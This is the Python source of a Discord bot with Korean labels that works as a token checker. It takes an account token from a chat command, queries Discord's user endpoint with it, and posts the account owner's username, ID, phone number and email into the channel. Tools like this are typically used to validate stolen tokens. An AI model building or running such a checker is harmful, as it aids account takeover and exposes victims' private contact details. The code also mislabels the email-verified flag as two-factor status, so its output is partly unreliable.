import discord
import requests

client = discord.Client()

def check(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    res = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
    if (res.status_code != 200):
        return False
    else:
        return res.json()
@client.event
async def on_message(message):
    if message.content.startswith("!토큰정보"):
        token = message.content.split(" ")[1]
        re = check(token)
        if re == False:
            embed = discord.Embed(title="토큰이 올바르지 않습니다.",description="",color=0xFF0000)
            await message.channel.send(embed=embed)
        else:
            res_json = re
            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
            user_id = res_json['id']
            avatar_id = res_json['avatar']
            avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
            phone_number = res_json['phone']
            email = res_json['email']
            mfa_enabled = res_json['mfa_enabled']
            flags = res_json['flags']
            locale = res_json['locale']
            verified = res_json['verified']
            embed = discord.Embed(title="토큰 정보",description=f"🎁유저 이름\n{user_name}\n🎁유저 아이디\n{user_id}\n🎁전화번호\n{phone_number}\n🎁이메일\n{email}\n🎁2차인증\n{verified}\n🎁토큰\n```cs\nPower by 미샤```")
            await message.channel.send(embed=embed)
client.run("봇 토큰")
